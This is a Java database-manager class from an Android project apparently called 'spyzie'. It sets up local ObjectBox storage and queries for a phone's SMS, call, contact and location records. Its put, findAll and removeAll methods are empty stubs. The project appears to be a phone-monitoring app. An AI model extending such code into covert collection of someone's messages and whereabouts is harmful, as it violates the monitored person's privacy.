package com.tantd.spyzie.data.db;

import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.Call_;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Contact_;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.Location_;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.model.Sms_;

import java.util.Collection;
import java.util.List;

import io.objectbox.Box;
import io.objectbox.query.Query;

public class AppDbManager implements DbManager {

    private static AppDbManager instance;

    private Box<Location> mLocationBox;
    private Box<Sms> mSmsBox;
    private Box<Call> mCallBox;
    private Box<Contact> mContactBox;
    private Query<Location> mLocationQuery;
    private Query<Sms> mSmsQuery;
    private Query<Call> mCallQuery;
    private Query<Contact> mContactQuery;

    public static synchronized AppDbManager getInstance() {
        if (instance == null) {
            instance = new AppDbManager();
        }
        return instance;
    }

    private AppDbManager() {
        mLocationBox = ObjectBox.get().boxFor(Location.class);
        mSmsBox = ObjectBox.get().boxFor(Sms.class);
        mCallBox = ObjectBox.get().boxFor(Call.class);
        mContactBox = ObjectBox.get().boxFor(Contact.class);

        mLocationQuery = mLocationBox.query().order(Location_._id).build();
        mSmsQuery = mSmsBox.query().order(Sms_._id).build();
        mCallQuery = mCallBox.query().order(Call_._id).build();
        mContactQuery = mContactBox.query().order(Contact_._id).build();
    }

    @Override
    public <T> void put(T t) {

    }

    @Override
    public <T> void put(T... ts) {

    }

    @Override
    public <T> void put(Collection<T> collection) {

    }

    @Override
    public <T> List<T> findAll(Class<T> tClass) {
        return null;
    }

    @Override
    public <T> void removeAll(Class<T> tClass) {

    }
}
